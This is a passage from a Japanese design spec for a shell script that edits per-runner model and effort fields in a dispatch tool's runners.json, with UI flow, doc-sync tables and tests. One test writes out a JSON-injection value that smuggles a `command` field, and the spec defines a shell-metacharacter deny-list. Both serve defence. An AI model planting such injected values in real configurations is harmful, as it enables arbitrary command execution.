   all-Codex の正典例 `gpt-5.6-sol` / `gpt-5.6-sol` / `gpt-5.6-terra` でまさに起きる。）
4. それでも枠が余ったら**枠を減らす**。ダミーは置かない。step 1 の除外は高々 1 件、
   step 3 の補充と合わせて必ず 1 件以上残るので、opt1 と合わせて最低 2 選択肢を満たす。

##### codex `review_model` を unset するときの警告

codex reviewer は `review_model` が必須で、未設定のまま reviewer に選ばれると
`prewarm-panes.sh` が

```
die "codex reviewer runner '<name>' requires review_model"
```

で**起動時に落ち、ディスパッチそのものが失敗する**。`--setup` の数日後に踏むと
原因に辿り着く手がかりが無い。3 段で防ぐ。

- **(a) S1** — codex runner の `review_model` 未設定は
  EN `unset (not review-capable)` ↔ JA `未設定（レビュアーに選べません）` と表示する（§2.1）。
- **(b) M2** — codex `review_model` の `back to the default (…)` 選択肢の description に
  EN `this runner can no longer be chosen as the reviewer` ↔
  JA `この runner はレビュアーに選べなくなります` と書く。opt1 の未設定表示も
  §2.4 規則 1 の 4 番目の形になり、S1 と語形が一致する。
- **(c) S6** — unset した結果その runner が現在の `review_runner`（project / global の
  どちらか）だった場合は、S6 の警告リストに載せる。

##### 自由入力の扱い

- **effort の "Other"** — engine 別 allowlist と照合する。範囲外なら警告して
  **その 1 問だけ**を再質問する（1 回まで）。2 回目も範囲外ならそのフィールドは
  変更せず、警告を S6 のプレビューへ持ち越す。`--setup` は永続化するので、
  `--override` のように黙って既定へフォールバックすると「入力した値と違う値が
  保存される」ことになり、あとから気づけない。
- **model の "Other"** — モデル名としては検証しないが、§1.3 の拒否条件
  （空白のみ / 5 つのシェルメタ文字 / `[[:cntrl:]]`）は適用される。違反したら警告して
  その 1 問だけを再質問する（1 回まで。effort と対称）。**この拒否条件は
  `setup-mode.md` / `setup-mode-ja.md` に明記する** — md を読む LLM がこの分岐を
  実行するので、条件が doc に無ければ機能しない（§3）。
- **空文字** — どちらの次元でも「変更なし」として扱う。

> **語彙について**: 役割キーの EN `back to unset` ↔ JA `未設定に戻す`
> （`setup-mode.md` S4/S5、`setup-mode-ja.md`、`README.md`、`guide-ja.md`、`SKILL.md`
> に一貫して出る）とは別の語彙 EN `back to the default (<d>)` ↔ JA `既定に戻す（<d>）`
> を使う。これは §2.1 が立てた「役割キーは三値なので状態を見せる、runner フィールドは
> 二値なので実効値を見せる」区別に基づく**意図的な差**である。

#### 2.5 S6 — プレビューと確認

プレビューが 2 ファイル分になる。

- `config.json` の before / after（既存どおり）
- `runners.json` は**編集対象の runner レコードだけ**の before / after。
  - **before**: `runners-edit.sh --runners <path> --name <runner> --show`
  - **after**: `runners-edit.sh --runners <path> --name <runner> <同じ --set / --unset 群> --dry-run`

  **両方ともレコード単体を出すので、呼び出し側の jq はゼロになる。** S7 に渡すのと
  完全に同じ `--set` / `--unset` 群を使うことが、プレビューと実書き込みの一致を担保する
  唯一の手段である。

S3-M で持ち越した警告（effort / model の "Other" 再入力失敗、codex `review_model` の
unset）があればここに列挙する。確認は従来どおり「書き込む / 中止」の 1 問。中止は
何も書かない。

#### 2.6 S7 — 書き込み

**現行 S7 の置き換えではなく、1 番目のステップとして挿入する。** 現行 S7 の散文は
**語句をそのまま残す**。特に次の 3 点は消してはならない。

| 温存対象 | 理由 |
|---|---|
| `so the whole result lands in a single atomic move.` を含む `config-edit.sh` の一文 | **`single atomic move` はリポジトリ全体で `setup-mode.md:140` にしか無く、SU5 が grep する 10 個の needle の 1 つ。しかもこの 1 個だけが今回の改訂対象セクション内にある。** 消すと SU5 が実際に赤くなる |
| `For the project destination, mkdir -p .dispatch first.` | SU3 / SU5 の grep 対象ではないので、消えてもテストが落ちない（M13 で SU に needle を足して塞ぐ） |
| `If the destination was the project layer, tell the user it now shadows the global layer for this repository.` | 同上 |

改訂後の順序:

```
1. runners-edit.sh を最大 1 回（全 --set / --unset を 1 コールに載せる）   ← 新規
2. プロジェクト書き込み先なら mkdir -p .dispatch                            ← 既存（原文温存）
3. config-edit.sh を最大 1 回。「so the whole result lands in a single
   atomic move」の一文を含む既存散文をそのまま維持する                      ← 既存（原文温存）
4. 双方を --show で表示する
5. プロジェクトレイヤーへ書いたならシャドウの旨を伝える                     ← 既存（原文温存）
```

**レジストリを先に書く**。役割キー（`design_runner` など）は runner を名前で参照するので、
config を書く時点でレジストリ側が確定している方が読み手にとって自然である。ここでは
runner の追加も削除もしないので順序が結果を変えることはないが、順序を決めておくこと
自体に価値がある。

**2 ファイルは 1 トランザクションではない**ことを明記する。各呼び出しは個別に原子的
だが、両者をまたぐ原子性は無い。**どちら向きの失敗でも、成功した分を報告したうえで
残りの完全なコマンドラインを提示して停止する。**

- 手順 1 が失敗 → 手順 3 を実行せず、`config-edit.sh` の完全なコマンドラインを提示。
- 手順 3 が失敗 → 手順 1 が成功済みである旨を伝え、`config-edit.sh` の完全な
  コマンドラインを提示。

**シェルのクォート規約**: `--set` の値には自由入力の model 文字列が載る。空白で引数が
割れ、`'` でクォートが破れる。`setup-mode.md` / `setup-mode-ja.md` に追加する記述例は
必ず単一引用付きにする。

```bash
bash <SKILL_DIR>/scripts/runners-edit.sh --runners <path> --name 'ccenec' \
  --set 'plan_model=opus[1m]' --set 'plan_effort=max' --unset exec_model
```

`--name` に渡す runner 名は §1.3 の deny-list の対象外（このスクリプトが書く値では
ないため）。M1 は `runners[]` から読んだ名前をそのまま使い、`'` を含む名前は S3-M の
対象から除外して警告する（§2.4 M1）。

---

### 3. ドキュメント同期

`apps/cmux-team-dispatch-task/CLAUDE.md` の 4 ファイル整合ルールと、`setup-mode.md` /
`setup-mode-ja.md` のミラー規則の両方に従う。**節単位で列挙する**（ファイル名だけだと
stale になる節が漏れる）。節名は実物の正式名で書く。

| ファイル | 節（実物の正式名） | 変更 |
|---|---|---|
| `references/setup-mode.md` | S1 / S2 / S3 / S6 / S7 | 本設計 §2 のとおり改訂。**S7 は挿入であり置換ではない**（§2.6 の温存表） |
| 〃 | `### S3-M`（新設） | 下位見出しは `####`。英日で個数・順序も一致 |
| 〃 | `## All writes go through \`config-edit.sh\`` | **改題 ＋ `runners-edit.sh` の I/F 段落を追記**（下記 3.1） |
| 〃 | S3-M（`*_model` の拒否条件） | 空白のみ / `'` `"` `` ` `` `$` `\` / `[[:cntrl:]]` を拒否する旨を明記（md を読む LLM が §2.4 の再質問分岐を実行するため） |
| 〃 | 候補プール表 | claude / codex の `*_effort` 行を**逐語**で持つ（SU12 のアンカー） |
| `references/setup-mode-ja.md` | 同上すべて | 同一構造・**同一見出しレベル・同一個数・同一順序**の日本語版。ユーザー可視文字列は §2 の JA 表記を使う |
| `SKILL.md` | `## Setup Mode (explicit configuration)` | 「役割別 model / effort も設定できる」旨を 1 文追加 |
| 〃 | `Both modes write exclusively through scripts/config-edit.sh` の 1 文 | 下記 3.1 の限定へ |
| 〃 | **First-run setup 見出し（`SKILL.md:433-434`）** | 現行は `(when runners.json does not exist, …, and when --setup selects the registry as a target)`。S3 に選択肢 2 が増えると「レジストリを対象に選んだ = First-run setup が起動する」が偽になるので、選択肢 1 / 3 に限る旨へ改める |
| `references/guide-ja.md` | `## セットアップモード（設定の明示構成）` | SKILL.md 変更の 1:1 訳 |
| 〃 | **`## リセットモード（設定のリセット）` 配下の `guide-ja.md:67`** | 「両モードとも書き込みは `scripts/config-edit.sh` **だけ**を通す」。`SKILL.md:117` の 1:1 訳だが**セットアップモード節ではなくリセットモード節の下**にあるので、節名だけを追うと漏れる |
| 〃 | **`### 設定（--setup）`（`guide-ja.md:1363`）** | `README.md:84-98` の逐語ミラー。README だけ直すと 4 ファイル整合違反。SKILL.md 由来ではないので「1:1 訳」では拾えない |
| 〃 | **`### 初回セットアップ`（`guide-ja.md:1641`）** | 本文の「…または `--setup` で `runners.json` を対象に選んだときは、初回セットアップが起動します」が同じ理由で偽になる |
| `README.md` | `### 設定（--setup）` | model / effort 設定を追記 |
| 〃 | **`README.md:286` の段落** | 「どちらも書き込みは `scripts/config-edit.sh` を通し、置換ではなくマージします」。§3.1 と同じ限定を付ける |
| `apps/cmux-team-dispatch-task/CLAUDE.md` | ファイル構成表 | `runners-edit.sh` の行を追加 |
| 〃 | **ファイル構成表の `runners.json` 行（`CLAUDE.md:23`）** | 「`--setup` / `--reset runners` からも**再生成**される」→ `--setup` はフィールド単位の編集も行う旨へ |
| 〃 | 保守手順 28 の「書き込みは **`scripts/config-edit.sh` だけ**を通す」（`CLAUDE.md:247`） | 「だけ」は追記では消えない。§3.1 と同じ限定へ書き換える |
| 〃 | 保守手順 28 の回帰行（`CLAUDE.md:251`） | `SU1-SU9` → **`SU1-SU16`**、`test-runners-edit.sh`（RE1-RE20）を追加 |
| 〃 | 保守手順 28 本文 | `runners-edit.sh` の契約、SU10-SU16 の needle 一覧、`setup-mode.md` が SU12 のアンカー行形式と S7 温存文を維持する義務を追加 |
| 〃 | **保守手順 44（`--override`）の末尾** | §2.4「次元単位 vs 役割単位」と effort 範囲外時の挙動差（`--override` は警告して既定へフォールバック / `--setup` は再質問）を**意図的な差**として 1 行残す |
| 〃 | 「テスト方法」E2E 項目 43 | 現行の「現在の設定表 → 書き込み先/対象 → 役割キー → 差分確認」に S3-M のケースを追記（§4.3 の限界と対） |

**変更不要と確認済み**（誤って足さないこと）: `.codex-plugin/plugin.json` /
ルート `.claude-plugin/marketplace.json`（version のみ保持、非目標により対象外）、
`references/loop-mode*.md` / `references/unattended/*.md`（`--setup` も `config-edit.sh`
も出現しない）、`docs/notification-gaps.md`、`guide-ja.md:1494-1497` と
`SKILL.md:490` / `guide-ja.md:1494` の「3 通りの設定経路」（主語が役割キー 5 つに
限定されているので変更後も真）、`runners.json` スキーマ節（`SKILL.md:337-372` /
`guide-ja.md:1560-1590` / `README.md:330-345`。6 フィールドと既定値表が既に完備）。

#### 3.1 「All writes go through …」の改題と I/F 段落の追記

**既存本文は残したうえで改題し、1 段落を追記する。** 置換すると SU5 が grep する
5 個の needle（`merges instead of replacing` / `writer-specific` /
`mktemp "$CONFIG.XXXXXX"` / `only when jq succeeded` / `shell_ready_ms`）が全滅する。

見出しを `## All writes go through the edit scripts` にするだけでは**偽になる**。
`setup-mode.md` の Scope 表は `runners.json` を含むので、改題後の見出しは
「`--setup` / `--reset` のすべての書き込みは 2 つの edit スクリプトを通る」と読めるが、

- First-run setup は `runners.json` を**自分で書く**（`SKILL.md:487`。非目標により変更しない）
- `--reset runners` は `rm -f "$RUNNERS_JSON"` + First-run setup で、`runners-edit.sh` を
  一切呼ばない
- `runners-edit.sh` はファイル未存在なら exit 2 で、新規作成しない（§1.5）

真に受けた将来の実装者が First-run setup を `runners-edit.sh` に寄せると、exit 2 で
永久にレジストリを作れないデッドロックになる。**主語を field-level 更新に絞り、
例外を明記する。**

> The two edit scripts own every **field-level** update. Creating `runners.json` from
> scratch and rebuilding it stay with First-run setup (SKILL.md Step 1f), which writes
> the file itself; `runners-edit.sh` only edits an existing registry and exits 2 when
> the file is absent.

**追記する I/F 段落**は、既存の `config-edit.sh` の I/F 記述（`--get <key>` and `--show`
read without writing まで）と同じ粒度で `runners-edit.sh` を書く。

- **7 つの long flag すべて**を含める: `--runners` / `--name` / `--set` / `--unset` /
  `--get` / `--show` / `--dry-run`。**SU14 はこの 7 個が doc に現れることを検査する**
  ので、1 つでも欠けると必ず落ちる（`--get` は §2 のフローに登場しないため、
  この段落が唯一の置き場所）。
- exit code 0 / 1 / 2 の意味。
- 原子的書き込み契約（writer 固有 `mktemp` + jq + 成功時のみ `mv`、置換ではなくマージ）。
  **SU11 のアンカー。**
- ファイル不在時は書き込みモードで exit 2、新規作成は First-run setup の担当。
  **SU11 のアンカー。**

`setup-mode-ja.md` の対応見出し「## 書き込みは全て `config-edit.sh` を通す」も同時に
改題し、同じ段落を訳す。SKILL.md の
`Both modes write exclusively through scripts/config-edit.sh` も同じ限定を付ける
（`--reset runners` は 2 スクリプトのどちらも通らないため、無条件の「2 スクリプトを
通る」は `--reset` について偽になる）。

#### 3.2 言語規則と既存テストの保護

**言語**: `SKILL.md` と `references/` 配下の `*-ja.md` でないファイルには日本語を
1 文字も書かない。`README.md` / `CLAUDE.md` / `*-ja.md` は日本語。
`node scripts/check-doc-lang.mjs` が硬いゲートとして効く。
**`runners-edit.sh` のコメントは日本語**（ルート / プラグイン CLAUDE.md の規約、
`config-edit.sh` の全コメントと同じ。`check-doc-lang.mjs` は `.sh` を見ないので
機械的には落ちない分、明記しておく）。

**ユーザー可視文字列は §2 の英日対応表に従う。** 英語 doc の表記をそのまま
ユーザーへ出してはならない。`check-doc-lang.mjs` は `*-ja.md` について
`empty-translation` しか見ないので、英語ラベルの素通りは機械的に検出できない。

**既存テストが grep する文字列を壊さない**:

- `test-setup-skill.sh` の SU5 は **2 ブロック・計 10 個**の文字列を `setup-mode.md` の
  平坦化テキストから探す。すべて温存する。
  - 書き込み契約 7 個: `merges instead of replacing` / `shell_ready_ms` /
    `writer-specific` / `mktemp "$CONFIG.XXXXXX"` / `only when jq succeeded` /
    **`single atomic move`** / `Never hand-assemble a jq invocation`
  - 三値セマンティクス 3 個: `a fixed value` / `the key absent` /
    `persistence options stay hidden`（三値セマンティクス節は今回**触らない**）
  - **10 個のうち `single atomic move` だけが今回の改訂対象セクション（S7）内にある。**
    §2.6 の温存表を参照。`shell_ready_ms` は 57 行と 165 行の 2 箇所にあり、
    改訂対象外の 57 行が残るので安全。
- SU1 は `SKILL.md` に `scripts/config-edit.sh` があることを求める。**温存する。**
- SU8 は `setup-mode.md` と `setup-mode-ja.md` の H1-H3 見出し数の一致を求める
  （現在**英日とも 18 個**）。`### S3-M` を両方へ足して 19 個ずつにする。下位見出しを
  `####` にするのはこのため。
- `## All writes go through` は `setup-mode.md:47` 以外から参照されていないことを
  確認済み。改題は安全。

---

### 4. テスト

#### 4.1 新規 `test/test-runners-edit.sh`（動的ユニットテスト）

`test-config-edit.sh` と同型。実際に一時ディレクトリへ `runners.json` を作り、
スクリプトを実行して結果を検証する。

| id | 不変条件 |
|---|---|
| RE1 | `--set` が指定 runner のフィールドだけを更新し、他 runner と `default` の**値**を変えない（jq は再整形するのでバイト比較は使わない） |
| RE2 | allowlist 外のフィールド名は exit 2。**`--set engine=codex` と `--unset engine` の両方**を検査する（`config-edit.sh` の CE5 と同型） |
| RE3 | engine 別 effort allowlist。**負**: claude runner に `minimal`、codex runner に `max` はどちらも exit 2。**正のコントロール**: claude×`max` / claude×`low` / codex×`minimal` / codex×`xhigh` は exit 0 で実際に書き込まれる（CE6 が正負の両半分を持つのに倣う。これが無いと allowlist の綴り間違いで全 effort が常に exit 2 になる実装でも緑になる） |
| RE4 | model はモデル名を allowlist しない: `[A-Za-z0-9._\[\]/-]` からなる任意の未知文字列が通る。**exit 2 になるもの**: 空文字 / 空白のみ / `'` / `"` / `` ` `` / `$` / `\` を含む値 / ESC（`\033`）を含む値 |
| RE5 | `--unset` が該当フィールドだけを削除し、同レコードの他フィールドを残す。**不在フィールドへの `--unset` は exit 0（冪等）** |
| RE6 | 未知の `--name` は exit 2 かつファイルが `cmp` でバイト同一 |
| RE7 | 複数の `--set` / `--unset` が 1 回の呼び出しでまとめて反映される |
| RE8 | 壊れた JSON では exit 1 かつ元ファイルを破壊しない |
| RE9 | temp の残骸が**全パス**で残らない。経路は 6 つ: 成功 / **`*_model` 検証エラー exit 2** / effort 検証エラー exit 2 / 未知 `--name` exit 2 / `--dry-run` / `mv` 失敗（下記 RE9b） |
| RE9b | **`mv` 失敗**は `chflags uchg`（対象ファイルを immutable 化）で作る。`mktemp` は親ディレクトリに作られるので**親を read-only にすると mktemp 段で落ち、`mv` 失敗ハンドラに到達しない**（`test-send-prompt.sh` の `$TMP/ro-parent` は `mkdir` 失敗の仕掛けで、rename 失敗の先例ではない）。exit 1 / 固有メッセージ / 残骸ゼロ / 原ファイル無傷を assert する。`chflags nouchg` を**アサーション前**に必ず実行する（`trap 'rm -rf "$TMP"' EXIT` が uchg ファイルを消せずテスト自身が残骸を残すため）。非 root ガードは `test-send-prompt.sh` SP6 の `[[ $EUID -ne 0 ]]` に倣い、`chflags` 不可なら skip |
| RE9c | **`mktemp` 失敗**（read-only 親ディレクトリ）は exit 1・残骸ゼロ・ファイル無変更 |
| RE10 | `--get` / `--show` は非破壊。未設定フィールドは空文字で exit 0。**ファイル不在時も `--get` は空 + exit 0、`--show` は `{}` + exit 0**。**`--show --name <未登録名>` は exit 2**（S6 の before がこの形を使う） |
| RE11 | 引数エラーはすべて exit 2: モードの同時指定 / モード未指定 / `--runners` 未指定 / **`--set` を `--name` 無し** / **`--get` を `--name` 無し** / **`--set` が `<field>=<value>` 形式でない** / 同一フィールドへの `--set` と `--unset` の同時指定 |
| RE12 | 編集対象レコード内の allowlist 外フィールドが生存する（置換ではなくマージ） |
| RE13 | **書き込みモードで** `--runners` が存在しないファイルを指すと exit 2。**かつ親ディレクトリを作らない**（`--runners "$TMP/nodir/runners.json"` に対し `[[ ! -d "$TMP/nodir" ]]`。`config-edit.sh:154` からの `mkdir -p` 写経を検出する）。読み取りモードの不在は RE10 |
| RE14a | **注入・拒否側**: `--set 'plan_model=a", "command": "pwned'` → exit 2 **かつ** `cmp` でファイルがバイト同一 |
| RE14b | **注入・往復側**: シェルメタ文字を含まないが **jq 構文として意味を持つ**値を実際に書き込む。`--set 'plan_model=opus[1m]'`（`[` `]` は jq の添字構文）で exit 0 + 完全一致往復 + `.command` / `.engine` / `.name` 不変 + 他 runner と `default` 不変。素朴な無引用補間 `.plan_model = $VALUE` は jq 構文エラーで落ちるので確実に検出できる。**この形なら逸脱分岐（§「タスク指示からの意図的な逸脱」）を採っても採らなくても弁別力が残る** |
| RE15 | `.runners` 欠落 / `null` / 非配列（オブジェクト）に対して **exit 2**（exit 1 では不可）かつファイル無変更。特にオブジェクトが配列へ化けないこと |
| RE16 | `--name` が 2 件一致する（重複 name）レジストリでは exit 2 かつファイル無変更 |
| RE17 | `engine` 欠落レコード / `engine: gemini` に `--set plan_effort=high` → exit 2 かつファイル無変更。**一方 `--unset plan_effort` は同じレコードでも exit 0**（engine 検証は `--set <*_effort>` 専用） |
| RE18 | `--dry-run` は当該レコードだけを stdout へ出し、**ファイルを変更しない**。`--get` / `--show` との併用は exit 2。**ファイル不在での `--dry-run` は exit 2** |
| RE18b | **`--dry-run` の出力内容**: 同一引数で `--dry-run` した出力と、実書き込み後に `--show --name` で得たレコードが `jq -S` 正規化のうえ一致する。これが無いと「編集前の JSON をそのまま出す」実装でも緑になり、S6 が「変わっていない after」を見せて write を承認させる |
| RE19 | 手順 2 の parse 失敗（壊れた JSON）で exit 1 したとき、**temp が 1 件も作られていない**（順序化により mktemp 前で落ちることの検証） |
| RE20 | `runners[]` が空配列のレジストリに対する `--set` は exit 2（`--name` が 0 件一致）。`--show` は素通しで exit 0 |

#### 4.2 `test/test-setup-skill.sh` の拡張（SU10〜SU16）

既存の SU1〜SU9 は変更しない。冒頭の必須ファイルリスト（現在 5 ファイル）に
`runners-edit.sh` を足し、SU12 / SU13 のアサーションを同じ担保の内側に置く。

**needle は SU5 と同じ形式で逐語列挙する**（概念だけ書くと実装者が grep 文字列を発明する）。

| id | 対象 | 不変条件と needle |
|---|---|---|
| SU10 | `setup-mode.md` | S3 の 4 択と `S3-M` の記載。needle: `S3-M` / 6 フィールド名（`plan_model` `review_model` `exec_model` `plan_effort` `review_effort` `exec_effort`）/ `unset (not review-capable)` / `no longer be chosen as the reviewer` / `mkdir -p .dispatch` / `shadows the global layer` / `[[:cntrl:]]`（model 拒否条件） |
| SU11 | `setup-mode.md` | `runners-edit.sh` と原子的書き込み契約。needle: `runners-edit.sh` / `runners.json.XXXXXX` / `exits 2 when the file is absent` / `First-run setup` |
| SU12 | `setup-mode.md` **と** `setup-mode-ja.md` の**両方** | codex effort の候補プール行に `max` が無いこと。下記のレシピ |
| SU13 | `SKILL.md` と `references/guide-ja.md` | 両方が `runners-edit.sh` に言及している |
| SU14 | `runners-edit.sh` と `setup-mode.md` | スクリプトが存在・実行可能で、引数なしで usage を出して exit 2。**双方向の I/F 整合**（下記） |
| SU15 | `setup-mode-ja.md` | SU10 相当の日本語 needle（6 フィールド名 / `S3-M` / `未設定（レビュアーに選べません）` / `レビュアーに選べなくなります` / `mkdir -p .dispatch` / シャドウ相当）。**加えて `####` の個数が `setup-mode.md` と一致すること**（SU8 は `^#\{1,3\} ` しか数えないので `####` の英日不一致を検出できない） |
| SU16 | `setup-mode.md` / `setup-mode-ja.md` | S7 温存文の存在。SU5 が守る `single atomic move` に加えて、SU5 の対象外である `mkdir -p .dispatch` と shadow 通知（英日それぞれ）を守る。SU10 / SU15 に含めてもよいが、S7 温存という意図を残すため独立させる |

**SU12 のレシピ**（重要）: `setup-mode.md` / `setup-mode-ja.md` には
**claude 行に正当な `max` が現れる**ので、素の `grep -q max` では必ず FAIL する。
一方、行スコープの否定 grep はアンカー行が消えた瞬間に 0 ヒットで黙って通る。
そこで §2.4 の候補プール表を**逐語で焼き込み**（英日で同一セル文言）、それをアンカーにする。

```
| claude `*_effort` | `max` / `xhigh` / `high` / `medium` / `low` |
| codex `*_effort`  | `xhigh` / `high` / `medium` / `low` / `minimal` |
```

SU12 は 4 部構成にする。

1. 各ファイルで **codex `*_effort` の行がちょうど 1 行**存在する（正のアンカー）。
2. **その行に `max` が無い**（負のアサーション）。
3. **正のコントロール**: claude `*_effort` の行が存在し、**`max` を含む**
   （両方から `max` を消す改訂で緑になる穴を塞ぐ。RE3 が正負両半分を持つのと同型）。
4. 対象ファイルが読めない場合と grep が status ≥ 2 を返す場合は **FAIL**
   （fail-open を禁じる。先例は `test-send-prompt-callsites.sh` の CS1 で、
   ルート `CLAUDE.md` 保守手順 9 に規約として明文化されている）。

**SU14 の双方向 I/F 整合**:

- **順方向**: `runners-edit.sh --help` 相当（引数なし usage）に現れる long flag
  7 個（`--runners` / `--name` / `--set` / `--unset` / `--get` / `--show` /
  `--dry-run`）がすべて `setup-mode.md` に現れる。doc の書き漏らしを検出する。
- **逆方向**: `setup-mode.md` の **`runners-edit.sh` 実行例ブロックから**
  `--[a-z-]\+` を抽出し、そのすべてが usage に存在する。doc が `--runner` /
  `--record` のような**実在しないフラグを書いている**ケースを検出する。範囲を
  実行例ブロックに限定すれば `config-edit.sh` のフラグを誤検出しない。
  S3-M / S7 をコピーする LLM が踏むのはこちらの向きである。

#### 4.3 テストに関する注意と、自動テストの限界

- 追加する 2 つのテストは **`prewarm-panes.sh` を一切呼ばない**。したがって
  「`prewarm-panes.sh` を呼ぶテストは先に worktree ディレクトリを `mkdir -p` する」
  という**直近の設計書で確立された実践**（`docs/superpowers/specs/2026-08-18-…` /
  `2026-08-19-…` と本タスクのプロンプトにある。CLAUDE.md には未明文化）に抵触する
  箇所は生じない。実装時にうっかり `prewarm-panes.sh` を呼ぶテストを足さないこと。
- シェルスクリプトは **bash 3.2 互換**（macOS 既定）。`set -u` 下で空になりうる配列を
  展開するときは `${arr[@]+"${arr[@]}"}` を使う。`config-edit.sh` の `JQ_ARGS` が
  まさにこの形。連想配列（bash 4+）は使わない。here-string（`<<<`）は bash 3.2 で使える。
- **自動テストの対象外を明示する。** M1 / M2 / M3 の質問構成、「第 1 選択肢は常に
  変更なし」、engine 別候補生成（規則 1〜4）、codex 候補が空のときのフォールバック、
  "Other" の再質問、S6 への警告持ち越し、S7 の 2 コール順序と非トランザクション性 —
  これらはすべて md を読む LLM の挙動で、SU10-16 の grep では担保されない。
  リポジトリの先例（`test-loop-skill.sh` / `test-setup-skill.sh` / CS3）も grep 止まり
  なので方針としては整合するが、**限界を認めたうえで** CLAUDE.md「テスト方法」
  E2E 項目 43 に S3-M のケースを追記し、人手で確認する（§3 の同期表に含めてある）。

---

## 検証ゲート

worktree ルートから次をすべて実行し、全スイートが通ること。

```bash
cd "$(git rev-parse --show-toplevel)/apps/cmux-team-dispatch-task"
fail=0
for t in test/*.sh; do
  printf '%-46s ' "$t"
  if bash "$t" >/dev/null 2>&1; then echo OK; else echo FAILED; fail=1; fi
done
cd "$(git rev-parse --show-toplevel)" && { pnpm check || fail=1; }
echo "gate exit: $fail"
```

FAILED が出たら、当該スイートを**リダイレクト無しで再実行**して原因を読む
（上のループは理由を捨てている）。`exit "$fail"` は対話シェルに貼ると端末が閉じるので、
スクリプト化するときだけ末尾に付ける。

`check-doc-lang` が OK を出すこと。`@tanaka-yui/token-meter` の
`noNonNullAssertion` 警告 4 件は既知のノイズで失敗ではない（`biome check` は
warning では exit 0 のまま）。

> `git rev-parse --show-toplevel` は worktree ルートを返す。タスクプロンプトの
> ゲートはメインリポジトリの絶対パスを指しているが、**検証すべきは worktree の
> 変更なのでこれは意図的な訂正**である。

テスト実行後、残骸が無いことを確認する。`git worktree list` は HEAD sha を、
`git branch --list` は `*` / `+` マーカーを含み、**並列ディスパッチ運用では他 worktree の
コミットだけで差分が出る**ので、正規化してから比較する。

```bash
SNAPDIR=$(mktemp -d)
snap() {
  git worktree list --porcelain | awk '/^worktree /{print $2}' | sort > "$1"
  git branch --list --format='%(refname:short)' | sort > "$2"
}
snap "$SNAPDIR/wt.before" "$SNAPDIR/br.before"
# ... run tests ...
snap "$SNAPDIR/wt.after" "$SNAPDIR/br.after"
diff "$SNAPDIR/wt.before" "$SNAPDIR/wt.after"   # && ではなく ; で繋ぐ
diff "$SNAPDIR/br.before" "$SNAPDIR/br.after"   # 両方を必ず出す
```

## タスク指示からの意図的な逸脱

タスク指示は「**Model strings are NOT validated.** Offer the common claude aliases
… but let any string through.」と述べている。本設計はこの意図（**モデル名の
allowlist を作らない** = 新しいモデル名がそのまま通る）を守るが、
**空白のみ・5 つのシェルメタ文字・制御文字だけは拒否する**（§1.3 / §1.3.1）。

理由: `--setup` は値を `runners.json` へ永続化し、それが bash の runner script 行と
`zsh -ic` の 2 層を通って以後の全ディスパッチにわたって再実行されるため。拒否する
文字は実在・将来のモデル名に現れない。

**この逸脱を採らない判断もありうる**（タスク指示に厳密に従い、無検証で通す）。
その場合に触る箇所は **7 つ**ある。「§1.3 の条件と RE4 を落とすだけ」では済まない。

| # | 箇所 | 撤回時の作業 |
|---|---|---|
| 1 | 「前提として守る事実」の model 行 | 「ただしシェルメタ文字と制御文字は拒否する」を削除 |
| 2 | §1.3 の `*_model` 条件 2 | 削除（条件 1 の非空チェックは残す） |
| 3 | §1.3.1 の節ごと | 参照先を失うので削除 |
| 4 | §2.4「model の "Other"」 | 「§1.3 の拒否条件は適用される。違反したら再質問」を削除。**再質問経路が 1 本消えるので S3-M のコール数上限が最悪 +3 から +2 に戻る** |
| 5 | §2.4 の再質問経路の数（3 本 → 2 本） | 上に同じ |
| 6 | §3 同期表の「S3-M（`*_model` の拒否条件）」行と SU10 の `[[:cntrl:]]` needle | 削除 |
| 7 | 「明示的に採らなかった対策」の該当行と本節 | 削除 |

RE4 の該当アサーションも削除する。**RE14a / RE14b は両分岐で成立するよう書かれている**
ので撤回対象に含めなくてよい（RE14a のペイロードは条件 2 が無ければ書き込まれ、
そのとき `--arg` 契約が守られていれば `.command` は不変のまま `.plan_model` に
リテラルで入る — どちらの分岐でも意味のあるアサーションになる）。

## 明示的に採らなかった対策

| 案 | 不採用の理由 |
|---|---|
| S7 に並行書き込みガード（書き込み直前に 6 フィールドを `--get` で読み直し、S1 表示と違えば中止） | `config.json` は同じ last-write-wins 特性を**文書化しているだけ**（CLAUDE.md 項目 19）。新スクリプトにだけガードを入れると 2 つの edit スクリプトが非対称になり、「ユーザーが求めた書き込みを中止する」という新しい失敗モードが増える。窓は S1 表示後に別ペイン（`--setup` の選択肢 1 / 3、別ペインの S3-M、`--reset runners`、Step 1f の runners reset）がレジストリを書いた場合に開く。**文書化のみ**とする |
| `runners.json` の symlink を `pwd -P` で解決してから書く | `config-edit.sh` は解決しない。片方だけ挙動を変えると非対称になる。**§1.4 に既存挙動として明記するのみ** |
| First-run setup を `runners-edit.sh` 経由に統一 | 非目標。回帰リスクだけが増え、§1.5 の exit 2 と衝突する |
| First-run setup / `--override` の model 自由入力にも §1.3.1 の防御を入れる | 非目標（既存経路の変更）。§1.3.1 に既知の限界として明記する |
| deny-list に `!` を加える（ルート CLAUDE.md 保守手順 27 と同じ 6 文字にする） | 手順 27 は `parallel-directive.sh` の出力位置に対する規約。model の位置では bash 層が非対話で history 展開が起きず、zsh 層は単一引用が `!` を保護するので load-bearing ではない。**意図的に 5 文字にしている**（§1.3.1 に理由を明記） |

## リスクと対処

| リスク | 対処 |
|---|---|
| S7 の改訂で `single atomic move` が消え SU5 が落ちる | §2.6 の温存表で原文維持を明記。§3.2 で「10 個のうちこの 1 個だけが改訂対象セクション内」と注記。SU16 が `mkdir -p .dispatch` と shadow 通知も守る |
| 英日の見出し数がずれて SU8 が落ちる | `### S3-M` を両ファイルへ同時に足し、下位見出しは英日とも `####` で同数・同順。SU8 が H1-H3 を、SU15 が `####` 数を検知する |
| `SKILL.md` に日本語が混入する | `pnpm check:doc-lang` が硬いゲート |
| 英語ラベルが日本語 doc へ素通りする | `check-doc-lang.mjs` では検出できないので、§2 で英日対応を全部確定させ、SU15 が日本語 needle を検査する |
| codex に `max` が漏れる | ドキュメント側は SU12（正アンカー + 負アサーション + claude 行の正コントロール）、スクリプト側は RE3 の負・正両方。**2 層で守る** |
| `runners-edit.sh` の jq 式が対象外の runner / フィールドを壊す | RE1 / RE12 / RE14b / RE15 / RE16 |
| 値補間実装による `.command` 書き換え → 任意コマンド実行 | §1.4 の `--arg` 契約を明文化 + RE14a / RE14b |
| codex `review_model` の unset で次回ディスパッチが `die` | §2.4 の 3 段防御（S1 表示 / 選択肢 description / S6 警告）+ SU10 / SU15 の needle |
